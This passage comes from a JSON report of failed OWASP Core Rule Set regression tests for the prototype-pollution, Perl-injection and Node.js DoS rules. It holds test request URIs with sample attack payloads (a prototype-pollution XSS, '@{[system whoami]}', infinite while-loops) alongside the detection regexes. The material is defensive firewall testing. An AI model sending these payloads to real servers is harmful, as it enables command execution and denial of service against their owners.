          "value" : "attack-injection-generic"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-GENERIC"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1/180/77"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "multi_match"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "934130",
    "test_id" : 7,
    "test_path" : "REQUEST-934-APPLICATION-ATTACK-GENERIC/934130.yaml",
    "description" : "positive test case with GET parameter, jQuery $.get",
    "cause" : "failed expect_id check: 934130 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 7,
      "desc" : "positive test case with GET parameter, jQuery $.get",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?__proto__[context]=<img/src/onerror%3dalert(1)>",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934130 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 934130,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " JavaScript prototype pollution injection attempts"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Example from https://hackerone.com/reports/869574 critical"
        }, {
          "type" : "Comment",
          "text" : " vulnerability in the TypeORM library:"
        }, {
          "type" : "Comment",
          "text" : " {\"text\":\"a\",\"title\":{\"__proto__\":{\"where\":{\"name\":\"sqlinjection\",\"where\":null}}}}"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Test cases are based on this list of payloads:"
        }, {
          "type" : "Comment",
          "text" : " https://github.com/BlackFan/client-side-prototype-pollution/blob/master/README.md"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " See also: https://cwe.mitre.org/data/definitions/1321.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Note: only server-based (not DOM-based) attacks are covered here."
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?:__proto__|constructor\\s*(?:\\.|\\]?\\[)\\s*prototype)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 934130
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "JavaScript Prototype Pollution"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-javascript"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-injection-generic"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-GENERIC"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1/180/77"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "multi_match"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "934140",
    "test_id" : 1,
    "test_path" : "REQUEST-934-APPLICATION-ATTACK-GENERIC/934140.yaml",
    "description" : "Perl interpolation attack",
    "cause" : "failed expect_id check: 934140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 1,
      "desc" : "Perl interpolation attack",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?x=@{[system+whoami]}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 934140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Perl generic RCE signatures ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Detects Perl-based injection attacks."
        }, {
          "type" : "Comment",
          "text" : " Example: @{[system whoami]}"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/934140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 934140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "^(?:[^@]|@[^\\{])*@+\\{[^\\}]*\\}"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 934140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Perl Injection Attack"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-perl"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-injection-generic"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-GENERIC"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/242"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "934160",
    "test_id" : 4,
    "test_path" : "REQUEST-934-APPLICATION-ATTACK-GENERIC/934160.yaml",
    "description" : "while falsy with negations",
    "cause" : "failed expect_id check: 934160 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=932236 - Remote Command Execution: Unix Command Injection (command without evasion)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 4,
      "desc" : "while falsy with negations",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?eval=while(!%2B0);",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934160 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 934160,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ NodeJS DoS signatures ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " NodeJS runs in a single thread, so any evaluated payloads that block execution can cause an easy DoS."
        }, {
          "type" : "Comment",
          "text" : " This rule attempts to block e.g. while(true)."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/934160.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 934160"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "while[\\s\\x0b]*\\([\\s\\x0b\\(]*(?:!+(?:false|null|undefined|NaN|[\\+\\-]?0|\\\"{2}|'{2}|`{2})|(?:!!)*(?:(?:t(?:rue|his)|[\\+\\-]?(?:Infinity|[1-9][0-9]*)|new [A-Za-z][0-9A-Z_a-z]*|window|String|(?:Boolea|Functio)n|Object|Array)\\b|\\{[^\\}]*\\}|\\[[^\\]]*\\]|\\\"[^\\\"]+\\\"|'[^']+'|`[^`]+`)).*\\)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 934160
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "base64Decode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "replaceComments"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Node.js DoS attack"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-javascript"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-nodejs"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-injection-generic"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-GENERIC"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/242"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "multi_match"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "934160",
    "test_id" : 7,
    "test_path" : "REQUEST-934-APPLICATION-ATTACK-GENERIC/934160.yaml",
    "description" : "while falsy with negations",
    "cause" : "failed expect_id check: 934160 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 7,
      "desc" : "while falsy with negations",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?eval=while(!\"\");",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934160 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 934160,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ NodeJS DoS signatures ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " NodeJS runs in a single thread, so any evaluated payloads that block execution can cause an easy DoS."
        }, {
          "type" : "Comment",
          "text" : " This rule attempts to block e.g. while(true)."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/934160.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 934160"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "while[\\s\\x0b]*\\([\\s\\x0b\\(]*(?:!+(?:false|null|undefined|NaN|[\\+\\-]?0|\\\"{2}|'{2}|`{2})|(?:!!)*(?:(?:t(?:rue|his)|[\\+\\-]?(?:Infinity|[1-9][0-9]*)|new [A-Za-z][0-9A-Z_a-z]*|window|String|(?:Boolea|Functio)n|Object|Array)\\b|\\{[^\\}]*\\}|\\[[^\\]]*\\]|\\\"[^\\\"]+\\\"|'[^']+'|`[^`]+`)).*\\)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 934160
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "base64Decode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "replaceComments"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Node.js DoS attack"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-javascript"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-nodejs"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-injection-generic"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-GENERIC"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/242"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "multi_match"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "934160",
    "test_id" : 9,
    "test_path" : "REQUEST-934-APPLICATION-ATTACK-GENERIC/934160.yaml",
    "description" : "while falsy with negations",
    "cause" : "failed expect_id check: 934160 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 9,
      "desc" : "while falsy with negations",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?eval=while(!``);",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934160 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 934160,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ NodeJS DoS signatures ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " NodeJS runs in a single thread, so any evaluated payloads that block execution can cause an easy DoS."
        }, {
          "type" : "Comment",
          "text" : " This rule attempts to block e.g. while(true)."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/934160.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 934160"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "while[\\s\\x0b]*\\([\\s\\x0b\\(]*(?:!+(?:false|null|undefined|NaN|[\\+\\-]?0|\\\"{2}|'{2}|`{2})|(?:!!)*(?:(?:t(?:rue|his)|[\\+\\-]?(?:Infinity|[1-9][0-9]*)|new [A-Za-z][0-9A-Z_a-z]*|window|String|(?:Boolea|Functio)n|Object|Array)\\b|\\{[^\\}]*\\}|\\[[^\\]]*\\]|\\\"[^\\\"]+\\\"|'[^']+'|`[^`]+`)).*\\)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 934160
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "base64Decode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "replaceComments"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Node.js DoS attack"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-javascript"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-nodejs"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-injection-generic"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-GENERIC"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/242"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "multi_match"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "934160",
    "test_id" : 20,
    "test_path" : "REQUEST-934-APPLICATION-ATTACK-GENERIC/934160.yaml",
    "description" : "while truthy with double negation",
    "cause" : "failed expect_id check: 934160 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 20,
      "desc" : "while truthy with double negation",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?eval=while(!!{});",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934160 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 934160,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ NodeJS DoS signatures ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " NodeJS runs in a single thread, so any evaluated payloads that block execution can cause an easy DoS."
        }, {
          "type" : "Comment",
          "text" : " This rule attempts to block e.g. while(true)."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/934160.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 934160"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "while[\\s\\x0b]*\\([\\s\\x0b\\(]*(?:!+(?:false|null|undefined|NaN|[\\+\\-]?0|\\\"{2}|'{2}|`{2})|(?:!!)*(?:(?:t(?:rue|his)|[\\+\\-]?(?:Infinity|[1-9][0-9]*)|new [A-Za-z][0-9A-Z_a-z]*|window|String|(?:Boolea|Functio)n|Object|Array)\\b|\\{[^\\}]*\\}|\\[[^\\]]*\\]|\\\"[^\\\"]+\\\"|'[^']+'|`[^`]+`)).*\\)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 934160
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
